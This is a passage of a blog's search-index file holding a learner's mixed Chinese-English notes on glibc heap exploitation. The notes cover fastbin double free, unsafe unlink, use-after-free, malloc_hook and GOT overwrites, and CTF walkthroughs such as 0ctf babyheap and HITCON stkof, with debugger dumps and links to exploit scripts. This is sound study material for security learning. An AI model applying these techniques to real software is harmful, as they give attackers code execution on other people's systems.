-<p><code>PLT GOT 的偏移都是 写死在文件上</code><br>the linker resolves all dynamically linked functions<code> at the beginning of the execution,</code> and then <code>makes the GOT read-only</code>. 这就是RELRC</p>
-<p>In partial RELRO, the non-PLT part of the GOT section (.got from readelf output) is read only but <code>.got.plt is still writeable</code>. Whereas in complete RELRO, the entire GOT (.got and .got.plt both) is marked as read-only.</p>
-<p><code>.got</code> Section 存放外部全局变量的 GOT 表，非延迟绑定<br><code>.got.plt</code> Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定。</p>
-<p>.got is for relocations regarding global ‘variables’ while .got.plt is a auxiliary section to act together with .plt when resolving procedures absolute addresses</p>
-<h2 id="编译安装glibc各版本"><a href="#编译安装glibc各版本" class="headerlink" title="编译安装glibc各版本"></a>编译安装glibc各版本</h2><p>下载源码后<br><a href="https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html">https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html</a></p>
-<h3 id="gcc10编译安装glibc-2-23"><a href="#gcc10编译安装glibc-2-23" class="headerlink" title="gcc10编译安装glibc 2.23"></a>gcc10编译安装glibc 2.23</h3><pre><code>../glibc-2.20/configure --prefix=/usr --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror</code></pre>
-<p><code>--disable-werror</code> 这项是忽略错误</p>
-<h3 id="gcc10编译安装glibc-2-27"><a href="#gcc10编译安装glibc-2-27" class="headerlink" title="gcc10编译安装glibc 2.27"></a>gcc10编译安装glibc 2.27</h3><pre><code>CFLAGS=&quot;-g -fcommon -Og&quot; CXXFLAGS=&quot;-g -fcommon -Og&quot; ../glibc-2.27/configure --prefix=/glibc/2.27 --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror </code></pre>
-<p>我编译的时候报了重复定义的错误，加<code>-fcommon</code> 忽视</p>
-<h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><p> first-fit behavior.<code>If a chunk is free and large enough, malloc will select this chunk.</code></p>
-<p>Whenever <code>any chunk</code> (not a fast chunk) is freed,<code> it ends up in the unsorted bin.</code> Insertion happens at the <code>HEAD of the list</code>.</p>
-<p>fast chunks end up in fastbins. As mentioned earlier, fastbins maintain a singly linked list and chunks are inserted and deleted from the HEAD end。<code>头插法</code></p>
-<h3 id="calc"><a href="#calc" class="headerlink" title="calc::"></a>calc::</h3><h4 id="索引计算公式：："><a href="#索引计算公式：：" class="headerlink" title="索引计算公式：："></a>索引计算公式：：</h4><p>The basic formula is as follows:</p>
-<pre><code>        IDX = (CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
-        On a 64 bit system the current values are:
-                MINSIZE: 0x20
-                MALLOC_ALIGNMENT: 0x10
-        So we get the following equation:
-        IDX = (CHUNKSIZE - 0x11) / 0x10</code></pre>
-<h4 id="chunksize计算公式：："><a href="#chunksize计算公式：：" class="headerlink" title="chunksize计算公式：："></a>chunksize计算公式：：</h4><pre><code>It is calculated as follows:
-        IF x + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
-        ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 
-        =&gt; CHUNKSIZE = (x + 0x8 + 0xf) &amp; ~0xf</code></pre>
-<p>64位下，将<code>最低四位置0</code>，因为size 总是16的倍数，要对齐</p>
-<p>当 req=24 时，request2size(24)=32。0x18+0x8+0xf &amp; ~0xf = 0x20而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节</p>
-<h3 id="fastbin-dup-c"><a href="#fastbin-dup-c" class="headerlink" title="fastbin_dup.c"></a>fastbin_dup.c</h3><p>**double-free **<br><a href="https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html">https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html</a><br>同一地址释放两次，再分配时，可以得到同一地址的两个指针，释放一个指针，但可通过另外一个指针操作释放的这个相同块，放入一些数据</p>
-<p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">https://blog.csdn.net/chennbnbnb/article/details/109284780</a><br>glibc2.31 版本下double free<br>tcache全称是Thead Cache</p>
-<p>首先要填充tcache bin，再分配释放后到 fastbin</p>
-<h3 id="fastbin-dup-into-stack-c-2-23"><a href="#fastbin-dup-into-stack-c-2-23" class="headerlink" title="fastbin_dup_into_stack.c 2.23"></a>fastbin_dup_into_stack.c 2.23</h3><p>在2.31下触发free(): double free detected in tcache 2</p>
-<p>fastbin 是单链，只有fd指针，指向下一个块<br>通过修改fd指针，指向一个伪造的fake chunk</p>
-<pre><code>gef➤  x/15gx 0x602010-0x10
-0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed twice]
-0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer
-0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]
-0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer
-0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
-0x602050:   0x4343434343434343  0x0000000000000000
-0x602060:   0x0000000000000000  0x0000000000020fa1
-0x602070:   0x0000000000000000</code></pre>
-<hr>
-<pre><code>unsigned long long *d = malloc(8);
-stack_var = 0x20;
-*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></pre>
-<p>fastbin 的fd指针指向下一个空闲块的<code> metadata开始的地址处</code><br>malloc 返回的地址指向的是<code>user data开始处</code>，d是double free后的重复块地址，所以上面的赋值是 将<code>fake_chunk的metadata起始地址 赋给 块中的fd指针</code>，因为这是 d 是double free，虽然分配了，但<code>也指向空闲块中</code>，将chUnk fd 指针指向一个 fake chunk 的metadata起始地址处，即prev_size ; size=20; userdata。</p>
-<pre><code>Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55555555a010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x7fffffffdd50, size=0x20, flags=)  ←  Chunk(addr=0x55555555a020, size=0x0, flags=) [incorrect fastbin_index] </code></pre>
-<p>可以看到成功</p>
-<p>typedef struct var newtype;<br>struct var 的别名为newtype、</p>
-<h3 id="heap-consolidation"><a href="#heap-consolidation" class="headerlink" title="heap_consolidation"></a>heap_consolidation</h3><p>Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.<br>edit a freed chunk using a heap overflow bug to cause consolidation</p>
-<p>overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed</p>
-<p>这样就再分配后，就有两个指针指向同一个块</p>
-<p>改写当前size中 is_prev位，使得释放当前块后，认为<code>前一个块是free的</code><br>heap_overflow </p>
-<pre><code>ptr2 = malloc(0x500);
-ptr2[-1] 指示size
-ptr[-2] 指示prev_size</code></pre>
-<p><code>fastbin_dup_consolidate.c 2.23</code><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate</a><br>利用在 large bin 的分配中 malloc_consolidate 机制绕过 fastbin 对 double free 的检查</p>
-<p>malloc(0x400) small bins（回收最大值）后，<code>fastbin 中的跑到 small bins中</code><br>[+] small_bins[4]: fw=0x55555555b000, bk=0x55555555b000<br> →   Chunk(addr=0x55555555b010, size=0x50, flags=PREV_INUSE)</p>
-<p>2.23 里malloc_consolidate，先回收 fastbins 里的到unsorted bin中，因为这个bin满足不了分配要来，按照大小 又到了small bins中，也有可能到达large bins中。</p>
-<p><code>此时可以再free() 一次，因为该块不在fastbin，释放后归到fastbins中。</code></p>
-<p>这样我们就相当于double free</p>
-<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>一般称被释放后没有被设置为 NULL 的内存指针为<code> dangling pointer</code></p>
-<p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p>
-<p>释放块后，指向其的指针不清除，所以可以再用这个指针写入数据</p>
-<h2 id="babyheap-2017"><a href="#babyheap-2017" class="headerlink" title="babyheap 2017"></a>babyheap 2017</h2><p>有点莽，说实话不是很懂<br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap</a><br><a href="https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html">https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html</a><br><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></p>
-<p>GNU/Linux 2.6.32 对应着glibc 2.23版本</p>
-<pre><code>┌─[zentreisender@parrotos]─[~/Documents/heap/题目]
-└──╼ $file /glibc/2.23/lib/libc-2.23.so 
-/glibc/2.23/lib/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /glibc/2.23/lib/ld-linux-x86-64.so.2, BuildID[sha1]=eb6c32093c3e8e3b1c03a382947ec4151d036d75, for GNU/Linux 2.6.32, with debug_info, not stripped</code></pre>
-<hr>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>The first will involve <code>causing heap consolidation to get a libc infoleak</code>. The second will involve using <code>a Fastbin Attack to write a oneshot gadget to the hooc of malloc</code>. The libc infoleak will allow us to break ASLR in libc and know the address of everything, and writing over the malloc hook with a ROP gadget (that will call system) will <code>give us a shell</code> when we call malloc (we need the infoleak to figure out where the malloc hook and rop gadget are)<br>也可以使用chunck overlap泄露unsorted bin的地址</p>
-<hr>
-<p>题目不是原本的相同实现方法，但思想是不变的<br>开启了<code>relrc</code>,不能修改got；alloc pointers in a <code>random mmap area</code>. Therefore, we do not know the address to launch the <code>“unsafe unlink” attack</code></p>
-<hr>
-<h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p><code>v6 = __readfsqword(0x28u);</code><br>Read memory from a location specified by an offset relative to the beginning of the GS segment.<br><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160">https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160</a></p>
-<pre><code>void* calloc (size_t num, size_t size);
-Allocate and zero-initialize array
-Size of each element.
-pData = (int*) calloc (i,sizeof(int));</code></pre>
-<p>fill 中size由自己定义，存在漏洞, the vulnerability is evident. We can fill the arbitrary length of input to the heap and overflow anything after that.</p>
-<p><code>$readelf -s /glibc/2.23/lib/libc-2.23.so | grep __malloc_hook</code></p>
-<p>我们想要做的是 泄露libc的基址，Heap overlap.<br>Overlapping two chunks to leak the address of the libc</p>
-<p>将 chunk 4 释放掉，其 fd 指针会被设置为指向 unsorted bin 链表的头部，这个地址在 libc 中，且相对位置固定，利用它就可以算出 libc 被加载的地址<br>这时新的chunk2也指向fd , bk</p>
-<p>调用 malloc() 时，首先判断 hook 函数指针是否为空，不为空则调用它。所以这里我们传入一个 one-gadget。<br><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
-<p><code>gef➤  x/10gx (long long)(&amp;main_arena)-0x30</code></p>
-]]></content>
-      <categories>
-        <category>heap</category>
-      </categories>
-      <tags>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>heap入门2</title>
-    <url>/2021/03/20/heap%E5%85%A5%E9%97%A82/</url>
-    <content><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>objdump -M intel -D ./heap0 | grep winner</code><br><code>gef➤  help search-pattern </code></p>
-<h2 id="nightmare"><a href="#nightmare" class="headerlink" title="nightmare"></a>nightmare</h2><h2 id="protostar-heap0"><a href="#protostar-heap0" class="headerlink" title="protostar:heap0"></a>protostar:heap0</h2><p><code>objdump -D heap0 | grep winner</code></p>
-<pre><code>┌─[zentreisender@parrotos]─[~/Documents/nightmare/modules/24-heap_overflow/protostar_heap0]
-└──╼ $objdump -M intel -D ./heap0 | grep winner
-080484b6 &lt;winner&gt;:
-080484e1 &lt;nowinner&gt;:</code></pre>
-<p>简单的堆溢出，复制时没有检查大小</p>
-<a id="more"></a>
-<h2 id="protostar-heap1"><a href="#protostar-heap1" class="headerlink" title="protostar:heap1"></a>protostar:heap1</h2><p>strcpy 没有检查大小<br>第一次strcpy进行溢出，覆盖地址为got表中put地址，第二次向puts地址写入winner()函数地址，接下来调用puts()的时候，实际上调用到winner()</p>
-<pre><code>gef➤  help search-pattern 
-SearchPatternCommand: search a pattern in memory. If given an hex value (starting with 0x)</code></pre>
-<p>可以用来搜索内存中值，打印位置</p>
-<h2 id="protostar-heap2"><a href="#protostar-heap2" class="headerlink" title="protostar:heap2"></a>protostar:heap2</h2><p>%p 打印地址</p>
-<pre><code>    00100ab3 48 8d 85        LEA        RAX=&gt;local_98,[RBP + -0x90]
-             70 ff ff ff
-    00100aba 48 83 c0 07     ADD        RAX,0x7</code></pre>
-<p>The strdup() function returns a pointer to a new string which is a duplicate of the string s.  Memory for the new string is obtained with malloc(3), and can be freed with free(3).</p>
-<p>复制时 没有大小检查，且是分配在堆上</p>
-<h2 id="Unlink-explannation"><a href="#Unlink-explannation" class="headerlink" title="Unlink() explannation"></a>Unlink() explannation</h2><p><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344">https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</a><br>malloc 代码 里有unlink</p>
-<h3 id="什么是unlink攻击"><a href="#什么是unlink攻击" class="headerlink" title="什么是unlink攻击"></a>什么是unlink攻击</h3><p>The most common scenario is a vulnerable <code>buffer that can be overflow </code>and has <code>a global pointer</code>. 要是全局变量  </p>
-<ol>
-<li>要有溢出漏洞</li>
-<li>chunk地址存在一指针数组中，且是全局变量</li>
-</ol>
-<p><code>unlink()</code> 是将双向链表的 块拿出来， 就需要重新调整 fd 和 bk 指针<br>例如 free 时和目前物理相邻的 free chunk 进行合并<br>It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.</p>
-<h3 id="第一个检查：："><a href="#第一个检查：：" class="headerlink" title="第一个检查：："></a>第一个检查：：</h3><p>The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have <code>pointers back</code> to our fake chunk.</p>
-<hr>
-<p>构建一个fake chunk，这个chunk 可以在已申请的chunk中构建，因为我们可以写入值。<br><code>temp = (uint64_t *)ptr0[2]; </code> 将fd的值指针化后赋给 temp<br><code>printf(&quot;Fd-&gt;bk:    \t\t%p\n&quot;, (void *)temp[3]); </code><br>%p 按十六进制输出数据 </p>
-<h3 id="void-为”无类型指针”"><a href="#void-为”无类型指针”" class="headerlink" title="void * 为”无类型指针”"></a>void * 为”无类型指针”</h3><p>内存分配函数 malloc 函数返回的指针就是 void * 型，用户在使用这个指针的时候，要进行强制类型转换，也就是显式说明该指针指向的内存中是存放的什么类型的数据 (int <em>)malloc(1024) 表示强制规定 malloc 返回的 void</em> 指针指向的内存中存放的是一个个的 int 型数据。</p>
-<hr>
-<h3 id="fake-chunk-fd-bk"><a href="#fake-chunk-fd-bk" class="headerlink" title="fake_chunk fd bk"></a>fake_chunk fd bk</h3><p>fd 在<code>0x10</code> 偏移处，bk 在<code>0x18</code>偏移处<br>fake= ptr0<br>target=ptr0<br><code>fake-&gt;fd = target-0x18 =FD </code>减0x18是因为下面是<code>取 bk </code><br>因为 FD-&gt; bk = fake FD的其他结构值都不重要，只要bk值，这里就是&amp;target，这个地址保存着fake chunk metadata的开始地址，即ptr0<br><code>target-0x18+0x18 = fake chunk = ptr0</code></p>
-<p>同理</p>
-<pre><code>fake-&gt;bk=target-0x10 =BK
-BK-&gt;fd = fake = ptr0
-target-0x10 + 0x10 =ptr0</code></pre>
-<p>we will edit the <code>heap metadata of the second chunk</code>, so that it will say that the previous chunk has been freed and it points to our fake chunk.<br>只要设置<code>prev_size</code>，到metadata开始处，就认为是其前一个块</p>
-<p>Then when we free the second chunk, it will cause our fake chunk to <code>be unlinked</code> and execute the <code>pointer write</code>.<br>will check that the size of our chunk is equal to the previous size of the chunk being freed<br><strong>利用堆溢出 来修改</strong></p>
-<hr>
-<p>The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.<br>现在不为0才跳过一些检查</p>
-<h3 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h3><pre><code>struct malloc_chunk &#123;
-  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
-  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
-  struct malloc_chunk* fd;         /* double links -- used only if free. */
-  struct malloc_chunk* bk;
-  /* Only used for large blocks: pointer to next larger size.  */
-  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
-  struct malloc_chunk* bk_nextsize;
-&#125;;</code></pre>
-<p>双向链表结构的bin中，fd_nextsize 指向下一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>bk_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>就是 bk 接下来的8字节，</p>
-<h3 id="unlink-写操作"><a href="#unlink-写操作" class="headerlink" title="unlink 写操作"></a>unlink 写操作</h3><p>unlink操作如下：：</p>
-<pre><code>FD = fake-&gt;fd;
-BK = fake-&gt;bk;
-FD-&gt;bk = BK
-BK-&gt;fd = FD</code></pre>
-<p>那么最后，<code>BK-&gt;fd = FD</code><br>Fd pointer: 0x55d9452cf038<br>Bk  pointer: 0x55d9452cf040<br>Bk-&gt;Fd:            0x55d946d5d420  即target地址存储的值<br>*target=fd=0x55d9452cf038</p>
-<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink</a><br>这时 chunk0_ptr 和 chunk0_ptr[3] 实际上就是同一东西。这里可能会有疑惑为什么这两个东西是一样的，因为 chunk0_ptr 指针在是放在数据段上的，<strong>地址在 0x601070</strong>，<strong>指向 0x601058</strong>，而 chunk0_ptr[3] 的意思是从 chunk0_ptr <strong>指向的地方</strong>开始数 3 个单位，所以 *<em>0x601058+0x08</em>3=0x601070**</p>
-<p>所以给chunk0[3] 赋值 就相当于给chunk赋值，最后chunk[0] 为改写地址处的内容<br>chunk0是指针（重要）<br>&amp;chunk0[3]==&amp;chunk0</p>
-<h2 id="nightmare-HITCON’14-stkof"><a href="#nightmare-HITCON’14-stkof" class="headerlink" title="nightmare HITCON’14: stkof"></a>nightmare HITCON’14: stkof</h2><p><code>00602100</code><br>Our exploitation process will contain two parts. The first will be<code> doing an Unlink Attack</code>, and the second will be a <code>GOT overwrite / infoleak</code>.</p>
-<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>Unlinking for the heap is the process of removing a chunk from a bin list (in this case for heap consolidation for performance improvement reasons).</p>
-<p>What this attack will do is <code>give us a write</code>.<br>However there are a lot of restrictions on what we can write and where we can write.<br>Essentially when an unlink happens, it will write pointers to a chunk to fill in the gap of the chunk that was taken out.<br>这就是写的来源<br>因为最后<code>BK-&gt;fd=FD</code></p>
-<p>本题中指针ptr，所在是一个指针数组，数组中的内容是指针，指向其他地方<br>首先我们要有一个指向 一个chunk块的指针ptr，来使得bk-&gt;fd 和 fd-&gt;bk指向fake chunk<br>题目中malloc后地址</p>
-<pre><code>                /* 将块地址保存在这里 */
-*(void **)(&amp;DAT_00602140 + (long)(int)DAT_00602100 * 8) = pvVar1;
-
-
-    004009a8 48 98           CDQE
-    004009aa 48 8b 55 88     MOV        RDX,qword ptr [RBP + local_80]
-                         将块地址保存在这里
-    004009ae 48 89 14        MOV        qword ptr [DAT_00602140 + RAX*0x8],RDX
-             c5 40 21 
-             60 00</code></pre>
-<p>动态运行下就知道地址</p>
-<pre><code> →   0x4009ae                  mov    QWORD PTR [rax*8+0x602140], rdx
-此时$rax   : 0x1               
-所以保存在地址0x602148</code></pre>
-<p>接着来设置 fake chunk 的fd , bk指针</p>
-<p>所以先分配两个块，这两个块不一定要相邻在一起，相邻可以简单地使用堆溢出，也好融合，然后在第一个块中创建fake chunk， 在free第二个块后，触发Unlink </p>
-<pre><code>那么fake chunk fd=ptr-0x18   , fd-&gt;bk=ptr
-fake chunk bk=ptr-0x10 , bk -&gt;fd=ptr</code></pre>
-<p>然后是设置size, pre_size和size要相符，然后是fd_nextsize == null （在glibc2.23下）</p>
-<p>unlink 后<br><code>*ptr=ptr-0x8*3</code><br>可以用来got覆写</p>
-<h3 id="GOT-Overwrite-Infoleak"><a href="#GOT-Overwrite-Infoleak" class="headerlink" title="GOT Overwrite / Infoleak"></a>GOT Overwrite / Infoleak</h3><p>现在有了一个指向指针数组的指针<br>就可以 向数组中写入指针</p>
-<hr>
-<p><a href="https://github.com/Finsenty54/attack-code/blob/master/heap/Hitcon_2014_stkof/myexploit.py">https://github.com/Finsenty54/attack-code/blob/master/heap/Hitcon_2014_stkof/myexploit.py</a><br>代码以及注解</p>
-<h2 id="zctf-2016-note2"><a href="#zctf-2016-note2" class="headerlink" title="zctf 2016 note2"></a>zctf 2016 note2</h2><p>把名字放在这里006020e0<br>最多四个块</p>
-<hr>
-<p><code>DAT_00602120</code>分配的块的地址放在这里，8字节，顺序排列<br>相应块的输入值大小放在DAT_00602140</p>
-<p>这些位置在<code>bss</code>中，全局未初始化变量</p>
-<pre><code>Chunk(addr=0x108c2a0, size=0x90, flags=PREV_INUSE)
-    [0x000000000108c2a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
-Chunk(addr=0x108c330, size=0x90, flags=PREV_INUSE)
-    [0x000000000108c330     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
-Chunk(addr=0x108c3c0, size=0x90, flags=PREV_INUSE)
-    [0x000000000108c3c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
-Chunk(addr=0x108c450, size=0x90, flags=PREV_INUSE)
-    [0x000000000108c450     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
-Chunk(addr=0x108c4e0, size=0x20b30, flags=PREV_INUSE)  ←  top chunk
-gef➤  x/32gx 0x00602120
-0x602120:    0x000000000108c2a0    0x000000000108c330
-0x602130:    0x000000000108c3c0    0x000000000108c450</code></pre>
-<p>自带的libc-2.19.so 太老了，使用2.23</p>
-<p>overwrite_append() 函数里有数组长度检查，没有堆溢出<br>教程这里，将输入的长度设为0x00，造成整数溢出？？因为确实0x00-1=0xffffffff，同时设置成0x00，还是会分配0x20的空间</p>
-<p>The first will hold our fake chunk for the unlink. The second chunk we will use to <code>overflow the metadata of the third chunk</code>. The third chunk will be the one which we overwrite the <code>heap metadata to point to the fake chunk,</code> and we free it.<br>只用修改prev_size</p>
-<hr>
-<pre><code>0x23ce320:    0x0000000000000000    0x0000000000000021
-0x23ce330:    0x3535353535353535    0x3535353535353535
-0x23ce340:    0x00000000000000a0    0x0000000000000090
-0x23ce350:    0x3131313131313100    0x3131313131313131</code></pre>
-<p>溢出</p>
-<p><a href="https://github.com/Finsenty54/attack-code/blob/master/heap/zctf_2016_note2/exploit.py">https://github.com/Finsenty54/attack-code/blob/master/heap/zctf_2016_note2/exploit.py</a><br>攻击代码<br><strong>泄露got表中内容，即实际地址值</strong></p>
-]]></content>
-      <categories>
-        <category>heap</category>
-      </categories>
-      <tags>
-        <tag>heap</tag>
       </tags>
   </entry>
 </search>
